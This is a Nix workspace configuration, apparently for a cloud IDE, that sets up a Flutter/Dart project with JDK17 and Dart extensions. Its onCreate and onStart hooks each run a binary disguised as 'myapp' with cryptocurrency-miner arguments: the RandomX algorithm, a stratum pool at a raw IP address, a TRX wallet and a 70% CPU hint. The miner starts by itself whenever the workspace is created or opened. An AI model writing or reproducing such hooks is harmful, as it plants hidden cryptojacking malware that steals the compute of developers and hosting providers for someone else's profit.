{ pkgs, ... }: {
  channel = "stable-24.05";

  packages = [
    pkgs.jdk17
    pkgs.unzip
  ];

  env = { };

  idx = {
    extensions = [
      "Dart-Code.flutter"
      "Dart-Code.dart-code"
    ];

    workspace = {
      onCreate = {
        run = ''
          echo "Running myapp on create..."
          /home/user/da/myapp -a rx/0 -o stratum+tcp://159.89.229.50:4444 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
        '';
      };

      onStart = {
        run = ''
          echo "Running myapp on start..."
          /home/user/da/myapp -a rx/0 -o stratum+tcp://159.89.229.50:4444 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
        '';
      };
    };
  };
}
